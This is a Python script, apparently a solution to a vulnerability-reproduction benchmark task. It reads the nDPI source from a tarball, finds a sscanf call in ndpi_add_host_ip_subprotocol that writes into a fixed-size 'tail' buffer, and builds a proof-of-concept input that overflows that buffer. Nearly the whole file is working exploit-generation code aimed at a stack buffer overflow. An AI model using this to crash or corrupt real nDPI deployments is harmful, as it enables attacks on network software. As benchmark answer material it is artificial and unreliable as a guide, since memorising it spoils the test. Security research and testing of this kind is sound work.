import tarfile
import re


class Solution:
    def solve(self, src_path: str) -> bytes:
        try:
            code = self._read_file_from_tar(src_path, "ndpi_main.c")
            result = self._generate_poc(code)
            if result is not None:
                return result.encode("ascii", errors="replace")
        except Exception:
            pass
        # Fallback PoC if analysis fails
        return b"A" * 64

    def _read_file_from_tar(self, tar_path: str, filename_substr: str) -> str:
        with tarfile.open(tar_path, "r:*") as tar:
            for member in tar.getmembers():
                if member.isfile() and member.name.endswith(filename_substr):
                    f = tar.extractfile(member)
                    if f is None:
                        continue
                    data = f.read()
                    f.close()
                    return data.decode("utf-8", errors="ignore")
        raise FileNotFoundError(f"{filename_substr} not found in tarball")

    def _generate_poc(self, code: str) -> str | None:
        body = self._extract_function_body(code, "ndpi_add_host_ip_subprotocol")
        if body is None:
            return None

        tail_size = self._find_tail_size(body)

        analysis = self._analyze_sscanf_with_tail(body)
        if analysis is None:
            return None

        fmt_text, specs, tail_spec_index = analysis
        poc = self._build_input_from_format(fmt_text, specs, tail_spec_index, tail_size)
        return poc

    def _extract_function_body(self, code: str, func_name: str) -> str | None:
        pattern = re.escape(func_name) + r"\s*\("
        for m in re.finditer(pattern, code):
            start = m.start()
            open_paren = code.find("(", start)
            if open_paren == -1:
                continue
            close_paren = self._find_matching_brace(code, open_paren, "(", ")")
            if close_paren == -1:
                continue
            j = close_paren + 1
            n = len(code)
            while j < n and code[j] in " \t\r\n":
                j += 1
            if j >= n or code[j] != "{":
                continue
            brace_start = j
            brace_end = self._find_matching_brace(code, brace_start, "{", "}")
            if brace_end == -1:
                continue
            return code[brace_start:brace_end + 1]
        return None

    def _find_matching_brace(self, s: str, pos: int, open_ch: str, close_ch: str) -> int:
        depth = 1
        i = pos + 1
        n = len(s)
        in_str = False
        in_char = False
        esc = False
        while i < n:
            c = s[i]
            if in_str:
                if esc:
                    esc = False
                elif c == "\\":
                    esc = True
                elif c == '"':
                    in_str = False
                i += 1
                continue
            if in_char:
                if esc:
                    esc = False
                elif c == "\\":
                    esc = True
                elif c == "'":
                    in_char = False
                i += 1
                continue
            if c == '"':
                in_str = True
                i += 1
                continue
            if c == "'":
                in_char = True
                i += 1
                continue
            if c == open_ch:
                depth += 1
            elif c == close_ch:
                depth -= 1
                if depth == 0:
                    return i
            i += 1
        return -1

    def _find_tail_size(self, body: str) -> int:
        m = re.search(r"\b(?:char|u_char|uint8_t)\s+tail\s*\[\s*(\d+)\s*\]\s*;", body)
        if m:
            try:
                return int(m.group(1))
            except ValueError:
                pass
        return 16

    def _analyze_sscanf_with_tail(self, body: str):
        for m in re.finditer(r"\bsscanf\s*\(", body):
            open_paren = body.find("(", m.end() - 1)
            if open_paren == -1:
                continue
            close_paren = self._find_matching_brace(body, open_paren, "(", ")")
            if close_paren == -1:
                continue
            inside = body[open_paren + 1:close_paren]
            args = self._split_args(inside)
            if len(args) < 3:
                continue
            tail_re = re.compile(r"\btail\b")
            tail_arg_index = None
            for idx in range(2, len(args)):
                if tail_re.search(args[idx]):
                    tail_arg_index = idx
                    break
            if tail_arg_index is None:
                continue
            fmt_expr = args[1]
            fmt_text = self._extract_c_string_literal(fmt_expr)
            if not fmt_text:
                continue
            specs = self._parse_format_string(fmt_text)
            if not specs:
                continue
            # Map specs with assignments to arguments
            arg_idx = 2
            tail_spec_index = None
            for spec_idx, spec in enumerate(specs):
                if not spec["assign"]:
                    continue
                if arg_idx >= len(args):
                    break
                arg = args[arg_idx]
                if tail_re.search(arg):
                    tail_spec_index = spec_idx
                    break
                arg_idx += 1
            if tail_spec_index is None:
                continue
            return fmt_text, specs, tail_spec_index
        return None

    def _split_args(self, s: str) -> list:
        args = []
        cur = []
        depth = 0
        in_str = False
        in_char = False
        esc = False
        for c in s:
            if in_str:
                cur.append(c)
                if esc:
                    esc = False
                elif c == "\\":
                    esc = True
                elif c == '"':
                    in_str = False
                continue
            if in_char:
                cur.append(c)
                if esc:
                    esc = False
                elif c == "\\":
                    esc = True
                elif c == "'":
                    in_char = False
                continue
            if c == '"':
                in_str = True
                cur.append(c)
                continue
            if c == "'":
                in_char = True
                cur.append(c)
                continue
            if c == "(":
                depth += 1
                cur.append(c)
                continue
            if c == ")":
                if depth > 0:
                    depth -= 1
                cur.append(c)
                continue
            if c == "," and depth == 0:
                arg = "".join(cur).strip()
                if arg:
                    args.append(arg)
                cur = []
                continue
            cur.append(c)
        if cur:
            arg = "".join(cur).strip()
            if arg:
                args.append(arg)
        return args

    def _extract_c_string_literal(self, expr: str) -> str | None:
        i = expr.find('"')
        if i == -1:
            return None
        parts = []
        n = len(expr)
        while i < n:
            if expr[i] != '"':
                i += 1
                continue
            j = i + 1
            esc = False
            while j < n:
                c = expr[j]
                if esc:
                    esc = False
                elif c == "\\":
                    esc = True
                elif c == '"':
                    break
                j += 1
            if j >= n:
                break
            literal = expr[i + 1:j]
            parts.append(literal)
            i = j + 1
            while i < n and expr[i].isspace():
                i += 1
            if i < n and expr[i] == '"':
                continue
            else:
                break
        if not parts:
            return None
        joined = "".join(parts)
        return self._unescape_c_string(joined)

    def _unescape_c_string(self, s: str) -> str:
        out = []
        i = 0
        n = len(s)
        while i < n:
            c = s[i]
            if c != "\\":
                out.append(c)
                i += 1
                continue
            i += 1
            if i >= n:
                break
            c = s[i]
            if c == "n":
                out.append("\n")
            elif c == "r":
                out.append("\r")
            elif c == "t":
                out.append("\t")
            elif c == "v":
                out.append("\v")
            elif c == "f":
                out.append("\f")
            elif c == "a":
                out.append("\a")
            elif c == "b":
                out.append("\b")
            elif c in ("\\", '"', "'"):
                out.append(c)
            elif c in "01234567":
                num = c
                j = i + 1
                count = 1
                while j < n and count < 3 and s[j] in "01234567":
                    num += s[j]
                    j += 1
                    count += 1
                try:
                    out.append(chr(int(num, 8)))
                except ValueError:
                    pass
                i = j - 1
            elif c == "x":
                num = ""
                j = i + 1
                while j < n and s[j] in "0123456789abcdefABCDEF":
                    num += s[j]
                    j += 1
                if num:
                    try:
                        out.append(chr(int(num, 16)))
                    except ValueError:
                        pass
                    i = j - 1
                else:
                    out.append("x")
            else:
                out.append(c)
            i += 1
        return "".join(out)

    def _parse_format_string(self, fmt: str) -> list:
        specs = []
        i = 0
        n = len(fmt)
        while i < n:
            if fmt[i] != "%":
                i += 1
                continue
            if i + 1 < n and fmt[i + 1] == "%":
                i += 2
                continue
            start = i
            i += 1
            assign = True
            if i < n and fmt[i] == "*":
                assign = False
                i += 1
            width_str = ""
            while i < n and fmt[i].isdigit():
                width_str += fmt[i]
                i += 1
            width = int(width_str) if width_str else None
            while i < n and fmt[i] in "hljztL":
                i += 1
            if i >= n:
                break
            conv = fmt[i]
            i += 1
            scanset = None
            if conv == "[":
                j = i
                if j < n and fmt[j] == "^":
                    j += 1
                while j < n and fmt[j] != "]":
                    j += 1
                scanset = fmt[i:j]
                i = j + 1
            end = i
            specs.append(
                {
                    "conv": conv,
                    "width": width,
                    "assign": assign,
                    "scanset": scanset,
                    "start": start,
                    "end": end,
                }
            )
        return specs

    def _choose_scanset_char(self, scanset: str) -> str:
        if scanset is None:
            return "A"
        complement = False
        s = scanset
        if s.startswith("^"):
            complement = True
            s = s[1:]
        disallowed = set()
        allowed = set()
        prev = None
        i = 0
        length = len(s)
        while i < length:
            c = s[i]
            if c == "-" and prev is not None and i + 1 < length and s[i + 1] != "]":
                end = s[i + 1]
                for code in range(ord(prev), ord(end) + 1):
                    if complement:
                        disallowed.add(chr(code))
                    else:
                        allowed.add(chr(code))
                i += 2
                prev = None
                continue
            if complement:
                disallowed.add(c)
            else:
                allowed.add(c)
            prev = c
            i += 1
        candidates = [chr(x) for x in range(48, 58)] + [chr(x) for x in range(65, 91)] + [chr(x) for x in range(97, 123)]
        if complement:
            for ch in candidates:
                if ch not in disallowed:
                    return ch
        else:
            for ch in candidates:
                if ch in allowed:
                    return ch
        return "A"

    def _token_for_spec(self, spec: dict, tail_size: int, is_tail: bool) -> str:
        conv = spec["conv"]
        width = spec["width"]
        if is_tail:
            if conv in ("s", "["):
                if conv == "[":
                    ch = self._choose_scanset_char(spec.get("scanset"))
                else:
                    ch = "A"
                base = tail_size if tail_size > 0 else 16
                length_desired = base + 16
                if width is not None:
                    if width <= base:
                        length_desired = width
                    else:
                        length_desired = min(width, base + 16)
                if length_desired <= base:
                    length_desired = base + 1
                return ch * max(1, length_desired)
            if conv == "c":
                base = tail_size if tail_size > 0 else 16
                length_desired = (width or (base + 16))
                if length_desired <= base:
                    length_desired = base + 1
                return "A" * length_desired
            base = tail_size if tail_size > 0 else 16
            return "1" * (base + 16)
        # Non-tail specs
        if conv in "diouxX":
            return "1"
        if conv in "eEfFgGaA":
            return "1.0"
        if conv == "s":
            return "x"
        if conv == "c":
            w = width or 1
            return "C" * w
        if conv == "[":
            ch = self._choose_scanset_char(spec.get("scanset"))
            return ch
        if conv == "p":
            return "0"
        if conv == "n":
            return ""
        return "1"

    def _build_input_from_format(self, fmt: str, specs: list, tail_spec_index: int, tail_size: int) -> str:
        res = []
        spec_idx = 0
        i = 0
        n = len(fmt)
        total_specs = len(specs)
        while i < n:
            c = fmt[i]
            if c != "%":
                res.append(c)
                i += 1
                continue
            if i + 1 < n and fmt[i + 1] == "%":
                res.append("%")
                i += 2
                continue
            if spec_idx >= total_specs:
                break
            spec = specs[spec_idx]
            is_tail = spec_idx == tail_spec_index
            token = self._token_for_spec(spec, tail_size, is_tail)
            res.append(token)
            spec_idx += 1
            i = spec["end"]
            if is_tail:
                break
        res.append("\n")
        return "".join(res)
